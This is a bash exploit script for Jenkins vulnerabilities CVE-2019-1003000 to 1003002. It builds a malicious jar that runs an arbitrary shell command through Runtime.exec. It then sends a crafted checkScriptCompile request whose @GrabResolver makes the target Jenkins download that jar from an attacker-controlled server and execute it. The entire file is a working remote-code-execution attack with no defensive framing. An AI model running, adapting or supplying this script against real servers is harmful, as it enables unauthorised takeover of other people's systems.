#!/bin/bash
#
# CVE-2019-1003000
# CVE-2019-1003001
# CVE-2019-1003002

function rand() {
    len=8
    if [[ ${1} ]]; then
        len=${1}
    fi

    cat /dev/urandom | tr -dc '0-9' | fold -w ${len} | head -1
}

function log_info() {
    green="\033[0;32m"
    nc="\033[0m"
    echo -e "${green}${1}${nc}"
}

if [[ ${#} != 3 ]]; then
    echo "Usage: $(basename ${0}) <url jenkins target> <payload> <url basepath payload attacker>"
    exit 1
fi

x="x$(rand 4)"
y="$(rand 1)"
base="lol/miau/${x}/${y}"
name="${x}-${y}"

target="${1}"
payload="${2}"
server="${3}"
url="${target}//descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0A@GrabResolver(name=%27miau.lol%27,%20root=%27${server}%27)%0A@Grab(group=%27lol.miau%27,%20module=%27${x}%27,%20version=%27${y}%27)%0Aimport%20Payload;"

log_info "Setting up tmp workspace..."
mkdir -p META-INF/services
mkdir -p ${base}

log_info "Creating Payload..."
cat <<EOF > Payload.java
public class Payload
{
    public Payload()
    {
        try
        {
            String payload = "${payload}";
            String[] cmds = {"/bin/bash", "-c", payload};

            java.lang.Runtime.getRuntime().exec(cmds);
        }
        catch (Exception e) { }
    }
}
EOF
cat Payload.java

log_info "Creating 3v!l jar..."
javac -source 1.6 -target 1.6 Payload.java
echo "Payload" > META-INF/services/org.codehaus.groovy.plugins.Runners
jar -f "${base}/${name}.jar" -v -c Payload.class META-INF/

log_info "Sending request..."
wget -qO- -T 5 "${url}"
echo ""

log_info "Waiting for target to grab temp jar before clean up..."
sleep 5s

log_info "Cleaning up..."
rm Payload.*
rm -rf "META-INF"
rm -rf "lol"
